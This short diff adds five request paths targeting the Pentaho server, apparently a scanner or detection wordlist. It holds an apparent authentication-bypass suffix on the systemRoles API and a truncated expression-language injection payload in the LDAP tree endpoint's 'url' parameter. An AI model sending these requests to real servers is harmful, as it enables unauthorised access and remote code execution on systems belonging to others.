@@ -1,0 +1,5 @@
+/pentaho/api/userrolelist/systemRoles?require-cfg.js
+/api/userrolelist/systemRoles?require-cfg.js
+/pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{T(java.net.InetAddress).getByName(
+/pentaho/Login
+/pentaho/api/ldap/config/ldapTreeNodeChildren/require.js
